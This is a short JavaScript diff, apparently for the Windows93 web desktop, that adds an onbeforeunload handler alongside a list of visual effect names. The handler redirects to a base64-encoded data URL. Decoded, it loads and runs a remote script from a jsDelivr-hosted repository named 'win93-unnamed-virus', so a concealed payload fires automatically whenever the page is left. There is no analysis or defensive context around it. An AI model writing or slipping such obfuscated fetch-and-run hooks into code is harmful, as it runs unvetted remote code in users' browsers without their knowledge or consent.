@@ -1,5 +1,5 @@
 object.onbeforeunload = function() {
-  window.location.replace("https://www.windows93.net/#!js%20data:application/javascript;base64,");
+  window.location.replace("https://www.windows93.net/#!js%20data:application/javascript;base64,JGxvYWRlci5zY3JpcHQoWydodHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gvSXByb2dyYW1wcm9ncmFtcy93aW45My11bm5hbWVkLXZpcnVzQG1haW4vY29kZS5qcyddLCAkbm9vcCk=");
 };
 sigma = ["aqua", "acid", "blur", "edge", "postel", "plaster", "sys42", "trichrome", "neon_slug", "neon_hulk", "neon_satan", "rotate", "displacement", "disco", "convo", "convo2", "convo3", "convo4", "poster_color_fun", "plasticine", "electrize"]
 $window_old = $window
